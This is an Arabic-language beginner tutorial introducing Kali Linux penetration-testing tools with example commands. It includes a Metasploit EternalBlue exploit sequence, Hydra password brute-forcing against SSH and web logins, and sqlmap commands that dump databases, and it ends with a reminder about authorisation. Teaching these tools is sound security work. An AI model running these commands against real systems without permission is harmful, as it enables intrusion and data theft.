ما هي Kali Linux؟

Kali Linux هي توزيعة Linux مخصصة لاختبار الاختراق والأمن السيبراني. تحتوي على أكثر من 600 أداة متخصصة يستخدمها المحترفون في اختبار الاختراق الأخلاقي.

1. Nmap - فحص الشبكات

أداة فحص الشبكات والمنافذ. تستخدم لاكتشاف الأجهزة المتصلة والخدمات المفتوحة.

nmap -sV 192.168.1.1          # فحص الخدمات
nmap -sn 192.168.1.0/24       # اكتشاف الأجهزة
nmap -A 192.168.1.1           # فحص شامل

2. Metasploit - اختبار الاختراق

إطار عمل متكامل لاختبار الاختراق. يحتوي على أكثر من 2500 ثغرة معروفة.

msfconsole                    # تشغيل الأداة
search eternalblue            # البحث عن ثغرة
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.1        # تحديد الهدف
run                           # التشغيل

3. Hydra - تخمين كلمات المرور

أداة قوية لتخمين كلمات المرور على خدمات مختلفة مثل SSH و FTP و HTTP.

hydra -l admin -P passwords.txt ssh://192.168.1.1
hydra -l admin -P pass.txt 192.168.1.1 http-post-form

4. Sqlmap - فحص SQL Injection

أداة لاكتشاف واستغلال ثغرات SQL Injection في تطبيقات الويب.

sqlmap -u "http://example.com/page?id=1" --dbs
sqlmap -u "http://example.com/page?id=1" --dump

5. Burp Suite - تحليل الويب

أداة لتحليل أمان تطبيقات الويب واعتراض الطلبات. تستخدم بشكل أساسي في اختبار تطبيقات الويب.

6. Wireshark - تحليل الشبكة

أداة لتحليل حركة الشبكة والتقاط الحزم. تساعد في فهم ما يحدث على الشبكة.

wireshark                     # تشغيل الواجهة الرسومية
tshark -i wlan0               # من سطر الأوامر
⚠️ تنبيه: جميع هذه الأدوات يجب استخدامها فقط على الشبكات والأجهزة التي تملكها أو لديك إذن كتابي باختبارها.
